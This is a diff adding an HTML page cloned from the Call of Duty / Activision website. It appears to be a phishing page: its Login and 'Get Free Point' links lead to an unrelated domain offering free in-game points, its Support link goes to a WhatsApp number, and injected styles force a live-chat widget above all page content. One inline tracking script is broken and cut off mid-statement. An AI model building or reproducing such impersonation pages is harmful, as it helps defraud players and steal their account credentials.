@@ -1,0 +1,2148 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+	
+
+
+    
+	
+
+  <head>
+    <meta name="description" content="Activision login page" />
+    <!-- OneTrust -->
+    <link rel="stylesheet" href="php-livechat/assets/style.css">
+<style>
+  /* Fix: body #main overflow:hidden breaks fixed position on mobile */
+  body #main,
+  body,
+  html {
+    overflow: visible !important;
+    overflow-x: hidden !important;
+  }
+  /* Fix: remove pointer-events blocking from overlays */
+  .video-overlay,
+  .video-bg-overlay,
+  #hero-video,
+  .background-video-container,
+  .atvi-cta-modal-overlay,
+  .modal-overlay {
+    pointer-events: none !important;
+  }
+  /* Force chat widget always on top and touchable */
+  #lc-host {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    z-index: 2147483647 !important;
+    pointer-events: auto !important;
+    display: block !important;
+    isolation: isolate !important;
+  }
+</style>
+    
+    <script>
+        let startTime = Date.now();
+
+        window.addEventListener('beforeunload', function() {
+            let endTime = Date.now();
+            let duration = endTime - startTime; // مدت زمان به میلی‌ثانیه
+
+            
+                    'Content-Type': 'application/json'
+                }
+            });
+        });
+    </script>
+    
+    <script>
+        var OneTrust = {
+            dataSubjectParams: {
+                id: "",
+                isAnonymous: false,
+                token : ""
+            }
+        };		
+        function otGetCookie (cookieName) {
+            var i = 0,
+                cookies = document.cookie.split(";"),
+                length = cookies.length,
+                trimRegex = /^\s+|\s+$/g,
+                cookiePair;
+
+            for (; i < length; i++) {
+                cookiePair = cookies[i].split('=');				
+                if (cookiePair[0].replace(trimRegex, '') === cookieName) return unescape(cookiePair[1]);
+            }
+        }
+        var loggedIn = otGetCookie("ACT_SSO_COOKIE") || otGetCookie("s_ACT_SSO_COOKIE") || false;
+        if(loggedIn) {
+            var site = "cod";
+            var xsrfToken = otGetCookie("XSRF-TOKEN");
+            fetch("" + site + "regulations/onetrust/auth", {
+                method: "POST",
+                headers: {
+                    "X-XSRF-TOKEN": xsrfToken
+                }
+            })
+            .then((response) => response.json())
+            .then((json) => {
+                OneTrust = {
+                    dataSubjectParams: {
+                        id: json.userId,
+                        isAnonymous: false,
+                        token : json.token
+                    }
+                };
+            });
+        }
+        window.addEventListener("OneTrustGroupsUpdated", handleOneTrustGroupsUpdated);
+        function handleOneTrustGroupsUpdated() {
+            if(loggedIn) {
+                var site = "cod";
+                var xsrfToken = otGetCookie("XSRF-TOKEN");
+                fetch("" + site + "regulations/onetrust/preferences?activeGroups=" + OnetrustActiveGroups, {
+                        method: "POST",
+                        headers: {
+                            "X-XSRF-TOKEN": xsrfToken
+                        }
+                });
+            }
+        }
+    </script>
+    <!--END OneTrust -->
+    
+    <script> var dataLayer = dataLayer || [];</script>
+    <script id="gtm-script" src="resources/common/scripts/gtmLayer.js?v="></script>
+
+    
+    
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+    })(window,document,'script','dataLayer','GTM-T6X8245');</script>
+    <!-- End Google Tag Manager -->
+
+    <title>LOGIN - CALL OF DUTY®</title>
+    
+    <script src="resources/common/scripts/font-loader.js"></script>
+    
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    
+    <meta name="keywords" content="login, activision" />
+    <meta name="sitename" content="cod">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" type="image/x-icon" href="resources/cod/images/favicon.ico" />
+    <link rel="icon" type="image/x-icon" href="resources/cod/images/favicon.ico" />
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    
+    
+    
+    
+    
+    
+         
+        <script src="https://www.google.com/recaptcha/api.js?hl=en" async defer></script>
+    
+    
+    
+
+
+
+
+
+
+
+<meta name="_csrf" content="IaP4JBxTbbgjzK7Ez_ObBJw_8MH87kamog6cRrqyCe0nqvoJXoDg54R4c0_TjJH9">
+<meta name="_csrf_header" content="X-XSRF-TOKEN">
+
+
+<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300,700%7COpen+Sans:300,400,700&amp;subset=latin,latin,latin" media="all">
+<meta property="og:image" content="resources/cod/images/COD-Badge_Meta.png" />
+
+<link rel="stylesheet" href="resources/common/styles/preload.css?v=" />
+
+
+
+
+
+<!--  Modernizr needs to be loaded in head as otherwise it can't use the html5shiv for IE -->
+<script src="resources/common/scripts/modernizr-1.7.min.js"></script>
+
+
+
+
+
+
+
+    <link rel="stylesheet" href="resources/common/styles/common-site-updated.css?v=1732728318240" />
+
+
+
+
+<link rel="stylesheet" href="resources/common/styles/sso-media-queries.css?v=1732728318240" />
+<link rel="stylesheet" href="resources/common/styles/responsive-site.css?v=1732728318240" />
+
+<link rel="stylesheet" href="resources/cod/styles/sso-site-specific.css?v=1732728318240" />
+<link rel="stylesheet" href="resources/cod/styles/site.css?v=1732728318240" />
+
+
+
+
+    
+
+
+  
+	
+	
+
+	<script>
+
+        var curUrl = window.location.href;
+		var isPrevOrStage = window.location.host.includes("stage") || window.location.host.includes("preview") || window.location.host.includes("test");
+        var domain = isPrevOrStage ? "s-dev" : "s";
+        var siteId, fetchUrl;
+
+        if(curUrl.includes("callofduty.com") > 0) {
+            siteId = "cod";
+            fetchUrl = "https://profile.callofduty.com"
+        }
+        else if(curUrl.includes("crashbandicoot.com") > 0) {
+			siteId = "crash";
+            fetchUrl = "https://" + domain + ".crashbandicoot.com";
+        }
+        else if(curUrl.includes("tonyhawkthegame.com") > 0) {
+            siteId = "th";
+            fetchUrl = "https://" + domain + ".tonyhawkthegame.com";
+        }
+        else if(curUrl.includes("sekirothegame.com") > 0) {
+            siteId = "sekiro";
+            fetchUrl = "https://" + domain + ".sekirothegame.com";
+        }
+        else if(curUrl.includes("activision.com") > 0) {
+            siteId = "activision";
+            fetchUrl = "https://" + domain + ".activision.com";
+        }
+
+		var OneTrust = {
+				dataSubjectParams: {
+					id: "",
+					isAnonymous: false,
+					token : ""
+				}
+			};		
+			function otGetCookie (cookieName) {
+				var i = 0,
+					cookies = document.cookie.split(";"),
+					length = cookies.length,
+					trimRegex = /^\s+|\s+$/g,
+					cookiePair;
+
+				for (; i < length; i++) {
+					cookiePair = cookies[i].split('=');				
+					if (cookiePair[0].replace(trimRegex, '') === cookieName) return unescape(cookiePair[1]);
+				}
+			}
+			var loggedIn = otGetCookie("ACT_SSO_COOKIE") || otGetCookie("s_ACT_SSO_COOKIE") || false;
+			if(loggedIn) {
+
+				var xsrfToken = otGetCookie("XSRF-TOKEN");
+				var ssoCookieValue = otGetCookie("ACT_SSO_COOKIE");
+    			var headers = {
+        			'Cookie': "ACT_SSO_COOKIE=" + ssoCookieValue,
+					'X-XSRF-TOKEN': xsrfToken
+    			}
+
+				fetch(fetchUrl + "" + siteId + "regulations/onetrust/auth", {
+					method: "POST",
+            		credentials: 'include',
+            		mode: 'cors',
+					headers: headers
+				})
+				.then((response) => response.json())
+				.then((json) => { 
+					OneTrust = {
+						dataSubjectParams: {
+							id: json.userId,
+							isAnonymous: false,
+							token : json.token
+						}
+					};
+					console.log("OneTrust: ",OneTrust);
+				})
+        		.catch(error => {
+                    // Handle errors
+                    console.error('Fetch error:', error); 
+                });
+			}
+			window.addEventListener("OneTrustGroupsUpdated", handleOneTrustGroupsUpdated);
+		    function handleOneTrustGroupsUpdated() {
+				if(loggedIn) {
+        			var xsrfToken = otGetCookie("XSRF-TOKEN");
+                    var ssoCookieValue = otGetCookie("ACT_SSO_COOKIE");
+                    var headers = {
+            			'Cookie': "ACT_SSO_COOKIE=" + ssoCookieValue,
+                        'X-XSRF-TOKEN': xsrfToken
+                    };
+					fetch(fetchUrl + "" + siteId + "regulations/onetrust/preferences?activeGroups=" + OnetrustActiveGroups, {
+							method: "POST",
+							credentials: 'include',
+                			mode: 'cors',
+							headers: headers
+					})
+            		.catch(error => {
+                        // Handle errors
+                        console.error('Fetch error:', error);
+                    });
+
+				}
+			}
+
+	</script>
+
+
+
+    <meta charset="UTF-8">
+
+    <meta name="country" content="US">
+
+	
+    
+
+         <script>var dataLayer = dataLayer || [],
+    	         digitalData = {"page":{"pageInfo":{"charSet":"UTF-8","language":"EN","country":"US","site":"callofduty","pageName":"callofduty:blackops6:home","siteSection":"blackops6","siteSubsection":"home"},"pageCategory":{"primaryCategory":"blackops6","pageType":"home","subCategory1":"home"},"targetEntity":{"locale":"en_US","brand":"callofduty","categoryId":"['blackops6', 'blackops6:home', 'callofduty:blackops6:home']","pageURL":"content/atvi/callofduty/blackops6/web/en/home.html","id":"home","name":"Call of Duty Black Ops 6 | Reveal"}}};
+    </script>
+
+    
+    
+
+	
+	
+    	<script src="js/18240914759.js" type="text/plain" class="opt-anon-category-2"></script>
+    
+
+
+    
+    
+
+     
+     
+    <base href=""> 
+
+
+
+	
+    
+
+    
+		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='gtm.js?id='+i+dl;j.addEventListener('load', function() { var _ge = new CustomEvent('gtm_loaded', { bubbles: true });                                                                                                                                                                           d.dispatchEvent(_ge);});f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T6X8245');</script>
+    
+
+
+    
+    
+
+
+
+
+    
+    
+
+    <meta name="template" content="cod-bo6-standard-template">
+    <meta name="description" content="Topple the old order and rule in Avalon as Season 01 brings six new multiplayer maps, seven new weapons, a new Zombies map, and more. Available now. Purchase now on Xbox, PC Microsoft Store, Battlet.net, PlayStation, and Steam.
+">
+
+
+
+    
+    
+
+    
+
+    
+
+	<link rel="image_src" href="content/dam/atvi/callofduty/cod-touchui/blackops6/meta/bo6-wz-s01_LP_season_meta-thumb.webp">
+
+    <meta property="og:title" content="Call of Duty®: Black Ops 6 | New FPS
+">
+    
+	
+	<meta property="og:description" content="Topple the old order and rule in Avalon as Season 01 brings six new multiplayer maps, seven new weapons, a new Zombies map, and more. Available now. Purchase now on Xbox, PC Microsoft Store, Battlet.net, PlayStation, and Steam.
+">
+	<meta property="og:type" content="website">
+
+    <meta property="og:image" content="content/dam/atvi/callofduty/cod-touchui/blackops6/meta/bo6-wz-s01_LP_season_meta-thumb.webp">
+    <meta property="og:image:url" content="content/dam/atvi/callofduty/cod-touchui/blackops6/meta/bo6-wz-s01_LP_season_meta-thumb.webp">
+    <meta property="og:image:secure_url" content="content/dam/atvi/callofduty/cod-touchui/blackops6/meta/bo6-wz-s01_LP_season_meta-thumb.webp">
+
+    <meta name="twitter:title" content="Call of Duty®: Black Ops 6 | New FPS
+">
+    
+	<meta name="twitter:description" content="Topple the old order and rule in Avalon as Season 01 brings six new multiplayer maps, seven new weapons, a new Zombies map, and more. Available now. Purchase now on Xbox, PC Microsoft Store, Battlet.net, PlayStation, and Steam.
+">
+    <meta name="twitter:image" content="content/dam/atvi/callofduty/cod-touchui/blackops6/meta/bo6-wz-s01_LP_season_meta-thumb.webp">
+    <meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:site" content="@CallofDuty">
+    <meta name="twitter:url" content="">
+
+    <!-- END SHARE META TAGS -->
+
+
+    
+    
+		
+
+
+   
+
+	
+
+    <script type="application/ld+json">
+        {
+          "@context": "http://schema.org",
+          "@type": "VideoGame",
+          "author": {
+                "@type": "Organization", 
+                "name": [""]
+          },
+          "contentRating": "",
+          "datePublished": "",
+          "description": "",
+          "gamePlatform": [],
+          "genre": ["Action Shooter"],
+          "image": "",
+          "name": "",
+	      "contentLocation": [],
+		  "playMode": [],
+		  "isAccessibleForFree": "False",
+          "inLanguage": [
+                {
+                    "@type": "Language",
+                    "name": "English"
+                }
+            ],
+            "thumbnailUrl": "",
+            "publisher": {
+                "@type": "Organization",
+                "name": "Activision Publishing",
+                "sameAs": [
+                    "http://www.activision.com",
+                    "user/ActivisionGames",
+                    "http://en.wikipedia.org/wiki/Activision"
+                ]
+
+            },        
+            "applicationCategory": "Game",
+            "operatingSystem": [],
+            "url": "",
+            "isPartOf": {
+                "@type":"VideoGameSeries",
+                "name":""
+            }
+        }
+
+    	</script>
+
+    
+    <!-- END SCHEMA TAGS -->
+
+    
+    
+    
+
+	<script> 
+        var ATVI = ATVI || {},
+			wcmmode;
+		if (false) wcmmode = 'edit';
+		if (false) wcmmode = 'design';
+		if (!false && !false) wcmmode = '';
+		ATVI.pageMode = wcmmode;
+		ATVI.pageEnv = ('www.callofduty.com'.indexOf('cmsauthor') > -1) ? 'dev' : 'prod';
+		ATVI.pageLocale = 'en';
+	</script>
+
+
+
+    
+    
+
+   
+
+   
+    <script>
+		(function() {
+            var winUrl = window.location.hostname,
+            	url = 'https://profile.callofduty.com/resources/common/scripts/sso.bar.js',
+            	prev = 'https://profile-dev.callofduty.com/resources/common/scripts/sso.bar.js',
+            	stage = 'https://profile-stage.callofduty.com/resources/common/scripts/sso.bar.js',
+            	author = '',
+            	scriptTag = document.createElement('script');
+            if (winUrl.indexOf('preview.') > -1 || winUrl.indexOf('test.') > -1 && prev) url = prev; //switch between "prev" and "url" for support team.
+            if (winUrl.indexOf('stage.') > -1 && stage) url = stage;
+            if (winUrl.indexOf('cmsauthor') > -1 && author) url = author;
+            scriptTag.setAttribute('src', url);
+            scriptTag.id = 'sso-bar-script';
+            document.write(scriptTag.outerHTML);
+        })();
+
+        var config = {
+			containerId: 'cdo-bar',
+    		locale: 'en',
+			cms: true,
+    		communityId: 'cod',
+    		customSupportPath: '' || null
+        };
+
+    </script>
+
+    
+    	<script>
+        	(function() {
+                var initSsoLibrary = function() {
+                    if (typeof SSO == "object") {
+                        window.ssobar = new SSO.Bar(config);
+                	} else {
+                    	setTimeout(function() {
+                        	initSsoLibrary();
+                        }, 250);
+                    }
+                };
+                initSsoLibrary();
+			})();
+      	  </script>
+		
+   
+
+
+
+    
+    
+
+      
+
+	
+
+    
+
+	
+
+    
+
+    
+
+    
+    
+<link rel="stylesheet" href="apps/atvi/global/clientlibs.3bf3f28740b0f13f93c845b52b11a008.css" type="text/css"><script type="text/javascript" src="apps/atvi/global/clientlibs.758141a2ca804b18932c01107218ca6c.js"></script>
+
+
+
+    
+        
+    
+<link rel="stylesheet" href="apps/atvi/callofduty/bo6/core/clientlibs.5ea724ba340dc44deb88f69a9138b9ec.css" type="text/css"><link rel="stylesheet" href="apps/atvi/callofduty/bo6/components/pages/home/clientlibs.7741783388c3a35184567a9cd1c58fb9.css" type="text/css"><script type="text/javascript" src="apps/atvi/callofduty/bo6/core/clientlibs.de576d1ae073bbd1ce688a856353cdee.js" defer></script><script type="text/javascript" src="apps/atvi/callofduty/bo6/components/pages/home/clientlibs.000c9de903e5ec274c2b1289b39c711b.js" defer></script>
+
+
+    
+
+    
+
+
+
+
+	
+    
+	
+	
+	
+	
+	
+        
+        
+           
+        
+        
+
+  
+
+
+    
+    
+    
+    
+    <link rel="icon" href="content/dam/atvi/callofduty/cod-touchui/blackops6/common/favicon/favicon.ico">
+	<link rel="icon" type="image/vnd.microsoft.icon" href="content/dam/atvi/callofduty/cod-touchui/blackops6/common/favicon/favicon.ico">
+    <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="content/dam/atvi/callofduty/cod-touchui/blackops6/common/favicon/favicon.ico">
+
+
+
+    <meta http-equiv="X-UA-Compatible" content="IE=100">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<link rel="apple-touch-icon" href="https://www.activision.com/content/dam/atvi/global/apple-touch-icon.png">
+	<meta name="robots" content="max-image-preview:large">
+
+    
+	
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    
+    
+        
+    
+
+    
+    
+<link rel="stylesheet" href="libs/wcm/foundation/components/page/responsive.6b768e2136fcc283bddfd16e964001ab.css" type="text/css">
+
+
+
+    
+
+    <!--adobe launch header scripts-->
+        
+    	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    	
+    <!--end adobe launch scripts-->
+
+
+	
+	
+
+	
+
+
+  </head>
+
+
+	
+    
+
+
+<body id="bo6-home">
+
+
+		
+		
+
+    
+        <!-- Google Tag Manager (noscript) -->
+        <noscript><iframe src="ns.html?id=GTM-T6X8245" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+		<!-- End Google Tag Manager (noscript) -->
+	
+
+
+
+        
+        
+	
+
+
+    
+
+        
+        <div class="root responsivegrid">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="atvi-experiencefragment aem-GridColumn aem-GridColumn--default--12">
+
+
+    
+    
+		<div id="atvi_experiencefragm" class=" atvi-module-container">
+			
+
+<section class="experience-fragment-container ">
+	
+
+	
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="cod-single-header aem-GridColumn aem-GridColumn--default--12">            
+
+    
+<link rel="stylesheet" href="apps/atvi/callofduty/global/components/structure/v2023/cod-single-header/clientlibs.7acc3685ac3ad0517389e6a109ac1b65.css" type="text/css">
+<script src="apps/atvi/callofduty/global/components/structure/v2023/cod-single-header/clientlibs.753c30379fb814ce5c5f0a31d05013e2.js"></script>
+
+
+      
+
+
+ 
+
+
+
+
+
+ 
+
+<header id="cod-single-header" class="cod-game-header ">
+
+	<a class="skip-to-main-content-link" href="#main">Skip To Main Content</a> 
+
+	<div class="cod-header_inner-container">
+
+		
+		<div class="cod-header_mobile-menu" data-menu="close">
+
+			
+			<div class="cod-header_mobile-button">
+
+                <button aria-label="Menu dropdown" role="button" aria-controls="mobile-dropdown" aria-expanded="false">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+
+			</div>
+
+			
+			<div id="mobile-dropdown" class="cod-header_mobile-dropdown">
+
+				<div class="cod-header_mobile-dropdown-inner-container">
+
+                    
+                    <div class="cod-header_mobile-secondary-menu">
+
+                        
+                        
+
+	 
+	
+
+	
+
+
+
+                        
+                        
+
+	 
+	
+
+	<a href="blackops6" aria-label="Visit the Call of Duty Black Ops 6 home page">
+		<div class="secondary-logo-text"></div>
+	</a>	
+
+
+    
+                        
+                        
+
+	 
+
+	<ul role="menu" id="menubar2" aria-label="Call of Duty Black Ops 6 Menu">
+
+		
+            
+                
+    
+			<li role="menuitem" data-index="0" class="dd" aria-expanded="false" aria-haspopup="true">
+
+                <a tabindex="0" data-entext="Features">
+
+					Features <span class="expand-arrow"></span>
+
+                </a>
+
+				
+                <ul role="menu" aria-label="Features">
+
+                    <li role="menuitem">
+                        <a href="blackops6/campaign" data-entext="Campaign">
+                           <p>Campaign</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/multiplayer" data-entext="Multiplayer">
+                           <p>Multiplayer</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/zombies" data-entext="Zombies">
+                           <p>Zombies</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/xbox" data-entext="Xbox">
+                           <p>Xbox</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/pc" data-entext="PC">
+                           <p>PC</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/ps5" data-entext="PS5">
+                           <p>PS5</p>
+                        </a>
+                    </li>
+                        
+                </ul>
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="1" aria-haspopup="false">
+
+                <a href="season-01" tabindex="0" data-entext="Season 01">
+
+					Season 01 
+
+                </a>
+
+				
+                
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="2" aria-haspopup="false">
+
+                <a href="blackops6/battlepass" tabindex="0" data-entext="Battle Pass">
+
+					Battle Pass 
+
+                </a>
+
+				
+                
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="3" aria-haspopup="false">
+
+                <a href="blog/blackops6" tabindex="0" data-entext="Blog">
+
+					Blog 
+
+                </a>
+
+				
+                
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="4" aria-haspopup="false">
+
+                <a href="guides/blackops6" tabindex="0" data-entext="Guides">
+
+					Guides 
+
+                </a>
+
+				
+                
+            </li>
+		
+
+		<li class="nav-ellipsis-dropdown">
+        	<button class="nav-ellipsis-dropdown-toggle" aria-label="See more links"><span>...</span></button>
+        	<ul class="nav-ellipsis-dropdown-menu"></ul>
+        </li>
+	</ul>
+
+
+
+                    </div>
+    
+                    
+                    <div class="cod-header_mobile-primary-menu">
+
+                        
+                        
+
+     
+    
+
+	<a href="" aria-label="Visit the Call of Duty home page">
+
+		<img src="content/dam/atvi/callofduty/cod-touchui/global/cod-logo.svg" alt="Call of Duty logo">
+
+	</a>	
+
+
+    
+                        
+                        
+
+	 
+	
+
+	<ul class="cod-header_global-list" role="menu">
+		<li role="menuitem" aria-haspopup="true" data-index="0" class="dd" aria-expanded="false">
+			<a href="#" data-entext="Games" aria-controls="submenu-games">Games <span class="expand-arrow"></span></a>
+    		<ul id="submenu-games" role="menu">
+				<li role="menuitem">
+
+	<a href="blackops6" data-entext="Black Ops 6">Black Ops 6 <span class="expand-arrow"></span></a>
+
+</li>
+                <li role="menuitem">
+
+	<a href="warzone" data-entext="COD: Warzone">COD: Warzone <span class="expand-arrow"></span></a>
+
+</li>
+				<li role="menuitem">
+
+	<a href="warzonemobile" data-entext="COD: Warzone Mobile">COD: Warzone Mobile <span class="expand-arrow"></span></a>
+
+</li>
+				<li role="menuitem">
+
+	<a href="mobile" data-entext="Call of Duty Mobile">Call of Duty Mobile <span class="expand-arrow"></span></a>
+
+</li>
+    		</ul>
+    	</li>
+		<li role="menuitem" aria-haspopup="true" data-index="1" class="dd" aria-expanded="false">
+			<a href="#" data-entext="News" aria-controls="submenu-news">News <span class="expand-arrow"></span></a>
+            <ul id="submenu-news" role="menu">
+				<li role="menuitem">
+
+	<a href="blog" data-entext="Blogs">Blogs <span class="expand-arrow"></span></a>
+
+</li>
+				<li role="menuitem">
+
+	<a href="guides" data-entext="Guides">Guides <span class="expand-arrow"></span></a>
+
+</li>
+				<li role="menuitem">
+
+	<a href="patchnotes" data-entext="Patch Notes">Patch Notes <span class="expand-arrow"></span></a>
+
+</li>
+            </ul>
+    	</li>
+		<li role="menuitem" data-index="2" aria-expanded="false">
+			
+
+	<a href="store" data-entext="Store">Store <span class="expand-arrow"></span></a>
+
+
+            
+		</li>
+		<li role="menuitem" aria-haspopup="true" data-index="3" class="dd" aria-expanded="false">
+			<a href="#" data-entext="Esports" aria-controls="submenu-esports">Esports <span class="expand-arrow"></span></a>
+			<ul id="submenu-esports" role="menu">
+            	<li role="menuitem">
+					<a href="https://www.callofdutyleague.com/en-us/" aria-label="Visit the Call of Duty League website" target="_blank" data-entext="Call of Duty League">Call of Duty League</a>
+				</li>
+            	<li role="menuitem">
+					
+
+	<a href="mobile/esports" data-entext="Call of Duty Mobile World Championship">Call of Duty Mobile World Championship <span class="expand-arrow"></span></a>
+
+
+				</li>
+            	<li role="menuitem">
+					<a href="https://www.worldseriesofwarzone.com/" aria-label="Visit the World Series of Warzone website" target="_blank" data-entext="World Series of Warzone">World Series of Warzone</a>
+				</li>
+            </ul>
+    	</li>
+		<li role="menuitem" aria-haspopup="false" data-index="4">
+			<a href="https://wa.me/+18145781101" data-entext="Support" aria-label="Visit the Activision Support website" target="_blank">Support</a>
+		</li>
+        <li role="menuitem" aria-haspopup="false" data-index="5">
+			<a href="https://www.xbox.com/xbox-game-pass?OCID=BO6_omc_xbo_codcom_nav" data-entext="Xbox Game Pass" aria-label="Learn more about Xbox Game Pass" target="_blank">Xbox Game Pass</a>
+		</li>
+		<li class="nav-ellipsis-dropdown">
+        	<button class="nav-ellipsis-dropdown-toggle" aria-label="See more links"><span>...</span></button>
+        	<ul role="menu" class="nav-ellipsis-dropdown-menu"></ul>
+        </li>
+    </ul>
+
+ 
+    
+                    </div>
+    
+                    
+                    <div class="cod-header_mobile-sso">
+    
+                        <div class="logged-out">
+                            <a class="sso-login" href="https://" data-entext="Login">Login</a> <span>|</span> <a href="https://profile.callofduty.com/cod/signup" class="sso-signup" aria-label="Sign up for a Call of Duty account" data-entext="Sign Up">Sign Up</a>
+                        </div>
+
+                        <div class="logged-in">
+                            <a class="sso-profile" href="https://profile.callofduty.com/cod/profile" aria-label="Visit your Call of Duty profile" data-entext="Profile">Profile</a> <span>|</span> <a class="sso-logout" href="https://profile.callofduty.com/do_logout" aria-label="Log out of your account" data-entext="Sign Out">Sign Out</a>
+                        </div>
+    
+                    </div>
+
+                </div>
+
+			</div>
+
+		</div>
+
+		
+		<div class="cod-header_primary-logo">
+
+			
+
+     
+    
+
+	<a href="" aria-label="Visit the Call of Duty home page">
+
+		<img src="content/dam/atvi/callofduty/cod-touchui/global/cod-logo.svg" alt="Call of Duty logo">
+
+	</a>	
+
+
+
+		</div>
+
+		
+		<div class="cod-header_secondary-logo">
+
+            
+
+	 
+	
+
+	
+
+
+
+		</div>
+
+        
+		
+
+
+		
+		<div class="cod-header_top-nav">
+
+			<div class="cod-header_desktop-nav_links">
+
+				<nav>
+
+                    
+                    
+
+                    
+                    
+
+	 
+
+	<ul role="menu" id="menubar2" aria-label="Call of Duty Black Ops 6 Menu">
+
+		
+        
+                
+    
+			<li role="menuitem" data-index="0" class="dd" aria-expanded="false" aria-haspopup="true">
+
+                <a tabindex="0" data-entext="Features">
+
+					Features <span class="expand-arrow"></span>
+
+                </a>
+
+				
+                <ul role="menu" aria-label="Features">
+
+                    <li role="menuitem">
+                        <a href="blackops6/campaign" data-entext="Campaign">
+                           <p>Campaign</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/multiplayer" data-entext="Multiplayer">
+                           <p>Multiplayer</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/zombies" data-entext="Zombies">
+                           <p>Zombies</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/xbox" data-entext="Xbox">
+                           <p>Xbox</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/pc" data-entext="PC">
+                           <p>PC</p>
+                        </a>
+                    </li>
+                        
+                
+
+                    <li role="menuitem">
+                        <a href="blackops6/ps5" data-entext="PS5">
+                           <p>PS5</p>
+                        </a>
+                    </li>
+                        
+                </ul>
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="1" aria-haspopup="false">
+
+                <a href="season-01" tabindex="0" data-entext="Season 01">
+
+					Season 01 
+
+                </a>
+
+				
+                
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="2" aria-haspopup="false">
+
+                <a href="blackops6/battlepass" tabindex="0" data-entext="Battle Pass">
+
+					Battle Pass 
+
+                </a>
+
+				
+                
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="3" aria-haspopup="false">
+
+                <a href="blog/blackops6" tabindex="0" data-entext="Blog">
+
+					Blog 
+
+                </a>
+
+				
+                
+            </li>
+		
+            
+                
+    
+			<li role="menuitem" data-index="4" aria-haspopup="false">
+
+                <a href="guides/blackops6" tabindex="0" data-entext="Guides">
+
+					Guides 
+
+                </a>
+
+				
+                
+            </li>
+		
+
+		<li class="nav-ellipsis-dropdown">
+        	<button class="nav-ellipsis-dropdown-toggle" aria-label="See more links"><span>...</span></button>
+        	<ul class="nav-ellipsis-dropdown-menu"></ul>
+        </li>
+	</ul>
+
+
+                    
+
+				</nav>
+
+			</div>
+
+		</div>
+
+		
+		<div class="cod-header_sso">
+
+			<div class="logged-out">
+				
+				<a href="https://free10800cp.top" class="sso-login" aria-label="Log into your Call of Duty account" data-entext="Login">Login</a>
+            </div>
+                    
+			<div class="logged-in" aria-expanded="false">
+
+                <div class="account-name">
+                	<button aria-label="Call of Duty Account Settings" aria-expanded="false"><img src="content/dam/atvi/callofduty/global/global-nav/profile_icon.png" alt="Profile Avatar logo"> <span id="username"></span></button>
+                </div>
+                    
+                <ul>
+                	<li><a href="https://profile.callofduty.com/cod/profile" class="sso-profile" data-entext="Linked Accounts">Linked Accounts</a></li>
+                	<li><a href="https://profile.callofduty.com/cod/info" class="sso-info" data-entext="Basic Info">Basic Info</a></li>
+                	<li><a href="https://profile.callofduty.com/cod/prefs" class="sso-preference" data-entext="Preferences">Preferences</a></li>
+                	<li><a href="https://profile.callofduty.com/do_logout" class="sso-logout" data-entext="Sign Out">Sign Out</a></li>
+                </ul>
+                    
+			</div>
+
+		</div>
+
+		
+		
+
+		
+		
+
+		
+		<div class="cod-header_cta">
+
+            
+			<a href="https://free10800cp.top" data-entext="Get Free Point" aria-label="Get Free Point">
+				<span class="cod-header_cta-desktop">Get Free Point</span>
+				<span class="cod-header_cta-mobile">Free Point</span>
+			</a>
+
+		</div>
+
+	</div>
+
+</header></div>
+
+    
+</div>
+</div>
+
+    
+</div>
+
+</section>
+		</div>
+	
+</div>
+<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
